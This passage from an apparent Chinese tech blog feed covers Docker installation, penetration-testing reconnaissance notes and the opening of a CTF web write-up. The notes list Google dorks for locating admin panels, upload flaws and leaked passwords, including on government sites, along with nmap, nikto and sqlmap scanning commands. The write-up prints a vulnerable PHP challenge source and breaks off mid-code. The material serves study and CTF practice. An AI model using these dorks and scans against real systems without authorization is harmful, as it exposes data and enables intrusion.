alt="1597204040087"></p><p>比较docker和虚拟机技术的不同：</p><ul><li>传统虚拟机，虚拟出一套硬件，运行一个完整地操作系统，然后在这个系统上安装和运行软件</li><li>容器内的应用直接运行在宿主机的内容，容器没有自己的内核，也没有我们的硬件，相对轻便</li><li>每个容器间相互隔离，每个容器内都有一个属于自己的文件系统，互不影响</li></ul><blockquote><p>DevOps(开发、运维)</p></blockquote><p><strong>更快速的交付和部署</strong></p><p>传统：一堆帮助文档，安装程序</p><p>Docker：打包镜像发布测试，一键运行</p><p><strong>更便捷的升级和扩缩容</strong></p><p>使用了Docker只有，我们部署应用就和搭积木一样！</p><p>项目打包为一个镜像，扩展 服务器A！服务器B</p><p><strong>更简单的运维</strong></p><p>在容器化之后，开发和测试环境高度一致</p><p><strong>更高效的计算资源利用</strong></p><p>Docker是内核级别的虚拟化，可以在一个物理机上运行很多容器实例！服务器的性能可以被压榨到极致。</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><hr><h3 id="Docker基本组成"><a href="#Docker基本组成" class="headerlink" title="Docker基本组成"></a>Docker基本组成</h3><hr><p> <img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3857054039,2046077413&fm=26&gp=0.jpg" class="lazyload" data-srcset="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3857054039,2046077413&fm=26&gp=0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="点击查看源网页"> </p><p><strong>镜像（image）：</strong></p><p>docker镜像好比一个模板，可以通过这个模板来创建容器服务，tomcat镜像=&gt;run=&gt;tomcat01容器（提供服务）。通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中的）</p><p><strong>容器（container）：</strong></p><p>Docker利用容器技术，独立运行一个或者多个组应用，通过镜像来创建的。</p><p>启动，停止，删除，基本命令</p><p>目前就可以把这个容器理解为简易的linux系统</p><p><strong>仓库（repository）:</strong></p><p>仓库就是存放镜像的地方！</p><p>仓库氛围公用仓库和私有仓库！</p><p>阿里云，有镜像加速器（容器仓库！）</p><h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><blockquote><p>环境准备</p></blockquote><p>1、一点点linux基础</p><p>2、centos</p><p>3、xshell</p><blockquote><p>环境查看</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">系统内核 3.10以上</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# uname -r</span><br><span class="line">4.18.0-193.el8.x86_64</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;8 (Core)&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;8&quot;</span><br><span class="line">PLATFORM_ID=&quot;platform:el8&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 8 (Core)&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:8&quot;</span><br><span class="line">HOME_URL=&quot;https://www.centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-8&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;8&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=&quot;8&quot;</span><br></pre></td></tr></table></figure><blockquote><p>安装</p></blockquote><p>查看帮助文档 <a href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install/</a> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">卸载旧版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum remove docker \</span></span><br><span class="line"><span class="bash">                  docker-client \</span></span><br><span class="line"><span class="bash">                  docker-client-latest \</span></span><br><span class="line"><span class="bash">                  docker-common \</span></span><br><span class="line"><span class="bash">                  docker-latest \</span></span><br><span class="line"><span class="bash">                  docker-latest-logrotate \</span></span><br><span class="line"><span class="bash">                  docker-logrotate \</span></span><br><span class="line"><span class="bash">                  docker-engine\</span></span><br><span class="line"><span class="bash"><span class="comment">#需要的安装包</span></span></span><br><span class="line">yum install -y yum-utils</span><br><span class="line"><span class="meta">#</span><span class="bash">设置镜像的仓库</span></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo#默认是国外的</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo#推荐使用阿里云</span><br><span class="line"><span class="meta">#</span><span class="bash">更新 yum软件包索引</span></span><br><span class="line">yum makecache fast</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 docker相关</span></span><br><span class="line">yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">启动 docker</span></span><br><span class="line">systemctl start docker</span><br><span class="line"><span class="meta">#</span><span class="bash">使用docker version 查看是否安装成功</span></span><br><span class="line">docker version</span><br><span class="line"><span class="meta">#</span><span class="bash">测试hello-world</span></span><br><span class="line">docker run hello-world</span><br><span class="line"><span class="meta">#</span><span class="bash">查看一下镜像</span></span><br><span class="line">[root@iZ2oaf2ocgsgqtZ ~]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">nginx               latest              8cf1bfb43ff5        3 weeks ago         132MB</span><br><span class="line">mattrayner/lamp     latest              05750cfa54d5        3 weeks ago         915MB</span><br><span class="line">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>了解：卸载docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">1、卸载依赖包</span></span><br><span class="line">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">2、删除资源路径</span></span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">/var/lib/docker docker的默认工作路径</span></span><br></pre></td></tr></table></figure><h3 id="阿里云镜像加速"><a href="#阿里云镜像加速" class="headerlink" title="阿里云镜像加速"></a>阿里云镜像加速</h3><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597221825800.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597221825800.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597221825800"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker #创建目录</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://4v2gnxz2.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF # 编写配置文件</span><br><span class="line">sudo systemctl daemon-reload # 重新加载服务配置文件</span><br><span class="line">sudo systemctl restart docker #重启docker服务</span><br></pre></td></tr></table></figure><h3 id="回顾hello-world流程"><a href="#回顾hello-world流程" class="headerlink" title="回顾hello-world流程"></a>回顾hello-world流程</h3><hr><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597222369220.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597222369220.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597222369220"></p><h2 id="Docker工作原理"><a href="#Docker工作原理" class="headerlink" title="Docker工作原理"></a>Docker工作原理</h2><hr><h3 id="Docker是怎么工作的？"><a href="#Docker是怎么工作的？" class="headerlink" title="Docker是怎么工作的？"></a><strong>Docker是怎么工作的？</strong></h3><p>docker是一个c/s架构的系统，Docker的守护进程运行在主机上。通过socket从客户端访问！</p><p>dockerserver接受到</p><p><img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597222979476.png" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/1597222979476.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1597222979476"></p><h3 id="Docker为什么比VM快"><a href="#Docker为什么比VM快" class="headerlink" title="Docker为什么比VM快"></a><strong>Docker为什么比VM快</strong></h3><p>1、Docker有着比虚拟机更少的抽象层</p><p>2、 docker利用的是宿主机的内核，vm需要 Guest OS。<img src="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/u=3228808222,3079667590&fm=26&gp=0.jpg" class="lazyload" data-srcset="/2020/08/11/docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-%E4%B8%80/u=3228808222,3079667590&fm=26&gp=0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"> </p><p>所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级的</p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集的一些姿势</title>
      <link href="2020/08/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF/"/>
      <url>2020/08/10/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<p>还记得某位大神说，渗透测试的灵魂就是信息收集，就最近所学的知识记下了一些笔记</p><span id="more"></span><h4 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h4><p>通过whois进行查询注册信息（两种方式）</p><p>web接口查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com</a> <a href="https://www.whois365.com.cn/">https://www.whois365.com.cn</a></p><p><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a> <a href="https://whois.aizhan.com/">https://whois.aizhan.com</a></p><p>通过kali linux下 自带的whois查询工具，通过命令进行whois查询</p><p>使用方法即 whois domian</p><h4 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h4><p>1子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、layer子域名挖掘机</p><p>2搜索引擎（谷歌hacker语法） site:sina.com </p><p>3web接口查询：<a href="http://tool.chinaz.com/subdomian">http://tool.chinaz.com/subdomian</a> <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p>4基于证书透明公开日志枚举：<a href="https://crt.sh/">https://crt.sh/</a> <a href="http://censys.io/">http://censys.io</a></p><p>5其他途径：<a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a> <a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p><h4 id="web站点信息收集"><a href="#web站点信息收集" class="headerlink" title="web站点信息收集"></a>web站点信息收集</h4><h5 id="cms指纹识别"><a href="#cms指纹识别" class="headerlink" title="cms指纹识别"></a>cms指纹识别</h5><p>1.在线工具 <a href="https://whatweb.bugscaner.com/look/">https://whatweb.bugscaner.com/look/</a></p><p><a href="https://www.yunsee.cn/finger.html">https://www.yunsee.cn/finger.html</a></p><p>2本地工具 whatweb</p><p>御剑指纹识别</p><p>大禹cms识别程序 <a href="https://github.com/Ms0x0/Dayu">https://github.com/Ms0x0/Dayu</a></p><h5 id="根据cms进行漏洞查询"><a href="#根据cms进行漏洞查询" class="headerlink" title="根据cms进行漏洞查询"></a>根据cms进行漏洞查询</h5><p>对于查询到的cms利用<a href="https://bugs.shuimugan.com网站进行查询/">https://bugs.shuimugan.com网站进行查询</a></p><h5 id="目录与隐藏文件探测"><a href="#目录与隐藏文件探测" class="headerlink" title="目录与隐藏文件探测"></a>目录与隐藏文件探测</h5><p>御剑、wwwscan、dirb、dirbuster等等工具</p><h5 id="判断网页静态还是动态"><a href="#判断网页静态还是动态" class="headerlink" title="判断网页静态还是动态"></a>判断网页静态还是动态</h5><p>通过访问/index.html 成功即是静态网页</p><p>而通过访问 /index.php /index.jsp 等带着后端脚本语言的扩展名 成功即为该脚本语言编写的后端的动态网页</p><h5 id="通过默认页面判断服务器的操作系统"><a href="#通过默认页面判断服务器的操作系统" class="headerlink" title="通过默认页面判断服务器的操作系统"></a>通过默认页面判断服务器的操作系统</h5><p>通过访问/Index.  报错来判断是win系统还是linux系统</p><p>因为win系统对大小写不敏感而linux对大小写敏感</p><h4 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h4><h5 id="谷歌黑客语法"><a href="#谷歌黑客语法" class="headerlink" title="谷歌黑客语法"></a>谷歌黑客语法</h5><table><thead><tr><th>关键字</th><th align="left">含义</th></tr></thead><tbody><tr><td>site</td><td align="left">搜所指定域名 例如:site:baidu.com</td></tr><tr><td>inurl</td><td align="left">指定url中是否存在某些关键字 例如：inurl:php?id=</td></tr><tr><td>intext</td><td align="left">指定网页中是否存在某些关键字 例如：intext:网站管理</td></tr><tr><td>filetype</td><td align="left">指定搜索文件类型 例如：flietype:txt</td></tr><tr><td>intitle</td><td align="left">指定网页标题是否存在某些关键字 例如：intitle:后台管理</td></tr><tr><td>link</td><td align="left">指定网页链接 link:baidu.com 指定月百度做了外链的站点</td></tr><tr><td>info</td><td align="left">指定搜索网页信息 info:baidu.com</td></tr></tbody></table><p>常用姿势</p><p>查找后台地址：site:域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</p><p>查找文本内容：site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p><p>查找可注入点：site:域名 inurl:aspx|jsp|php|asp</p><p>查找上传漏洞：site:域名 inurl:file|load|editor|Files</p><p>找eweb编辑器：site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p><p>存在的数据库：site:域名 filetype:mdb|asp|#</p><p>查看脚本类型：site:域名 filetype:asp/aspx/php/jsp</p><p>迂回策略入侵：inurl:cms/data/templates/images/index/</p><p>各种敏感数据收集：</p><p>filetyle:xls inurl:gov username password</p><p>inurl:phpmyadmin/main.php intitle:phpmyadmin</p><p>filetype:inc inurl:config.inc host</p><p>filetype:sql cdb_members inurl:forumdata</p><p>filetype:txt inurl:”新建文本文档.txt”密码</p><p>inurl:phpinfo.php intitle:”phpinfo()””PHP Version”+”Server API”</p><p>filetype:log inurl:log mdb</p><h3 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h3><h5 id="二层主机发现"><a href="#二层主机发现" class="headerlink" title="二层主机发现"></a>二层主机发现</h5><p>在局域网中使用基于数据链路层的arp协议</p><p>arping工具（单个主机扫描） </p><p>netdiscover工具 （对特定子网进行扫描）</p><h5 id="三层主机发现"><a href="#三层主机发现" class="headerlink" title="三层主机发现"></a>三层主机发现</h5><p>可以远程发现网络层的协议 经过路由的主机 使用ICMP协议</p><p>经常被防火墙过滤</p><p>ping工具（单个）</p><p>fping（多个主机）</p><p>hping3（发送自定义的icmp包）</p><h5 id="四层主机发现"><a href="#四层主机发现" class="headerlink" title="四层主机发现"></a>四层主机发现</h5><p>传输层 TCP、UDP 可以远程探测</p><p>nmap  IP</p><p>hping3 –udp -c 1000 -p 80 ip</p><p>nwatch等python脚本</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>信息收集 目标探测 服务判断 系统判断 系统角色分析</p><p>端口是设备与外界通讯交流的出口。端口可以分为虚拟端口和物理端口</p><p>一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号</p><h4 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h4><p>nmap ip</p><p>Dmitry -p ip （进行tcp端口扫描）</p><p>netcat -nvz  ip（netcat又可以输入为nc）</p><h4 id="端口的分类（0-65535）"><a href="#端口的分类（0-65535）" class="headerlink" title="端口的分类（0~65535）"></a>端口的分类（0~65535）</h4><p>tcp端口和udp端口。tcp和udp协议独立，可以同时存在tcp235端口和udp235端口</p><p>周知端口（0~1023）</p><p>周知端口就是众所周知的端口号（默认了端口对应的服务）</p><p>动态端口（49152~65535）</p><p>不固定某种服务，动态分配</p><p>注册端口（1024~49151）</p><p>分配给用户进程或者应用程序</p><h5 id="端口banner信息获取"><a href="#端口banner信息获取" class="headerlink" title="端口banner信息获取"></a>端口banner信息获取</h5><p>nmap IP –script banner -p 端口号</p><p>dmitry -pb  ip </p><p>nc -nv ip 20-30</p><h5 id="端口服务版本和操作系统版本的信息"><a href="#端口服务版本和操作系统版本的信息" class="headerlink" title="端口服务版本和操作系统版本的信息"></a>端口服务版本和操作系统版本的信息</h5><p>端口服务版本信息：nmap -p 端口号 -sV IP地址</p><p>操作系统版本信息：namp -O ip</p><p>所有信息：namp -A -v IP地址</p><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>漏洞扫描原理：通过发送对应的验证数据到目标具体服务进行验证。当收的响应与存在漏洞的响应一致时，表明存在漏洞</p><h5 id="系统漏洞扫描"><a href="#系统漏洞扫描" class="headerlink" title="系统漏洞扫描"></a>系统漏洞扫描</h5><p>nmap –script vuln ip</p><p>nessus 系统漏洞扫描</p><p>metaspliot进行漏洞利用</p><h5 id="web应用程序漏洞扫描"><a href="#web应用程序漏洞扫描" class="headerlink" title="web应用程序漏洞扫描"></a>web应用程序漏洞扫描</h5><p>owasp zap漏洞扫描器</p><p>nikto -host ip 漏洞扫描</p><p> sqlmap等漏洞利用工具使用</p><h4 id="通过ping-命令反回的ttl值判断系统类型"><a href="#通过ping-命令反回的ttl值判断系统类型" class="headerlink" title="通过ping 命令反回的ttl值判断系统类型"></a>通过ping 命令反回的ttl值判断系统类型</h4><p>ttl&lt;128 win系统</p><p>ttl&lt;64 linux 系统</p><p>每过一个路由器ttl减1</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[安洵杯 2019]easy—_web</title>
      <link href="2020/08/09/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy%E2%80%94-web/"/>
      <url>2020/08/09/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy%E2%80%94-web/</url>
      
        <content type="html"><![CDATA[<p>因为waf的问题，反斜杠逃逸绕过黑名单，这个题的这个考点很有趣</p><span id="more"></span><h1 id="尝试之路加wp"><a href="#尝试之路加wp" class="headerlink" title="尝试之路加wp"></a>尝试之路加wp</h1><p><img src="https://img-blog.csdnimg.cn/20200621095811978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621095811978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20200621095841746.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621095841746.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"><br>观察源代码和get所传参数可猜测img所传参数img就是该图片<br>经过两次base64编码和一次hex编码后可得555.png成果验证猜测</p><p>然后发现该图片以data元数据封装的方式放到了源码里<br>猜测可以通过此漏过获得index.php的源码</p><p>于是将img处参数设为经过两次base64编码和一次hex编码后的index.php<br>成功获得index.php源代码<br><img src="https://img-blog.csdnimg.cn/20200621100355162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200621100355162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NDU4Ng==,size_16,color_FFFFFF,t_70" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span 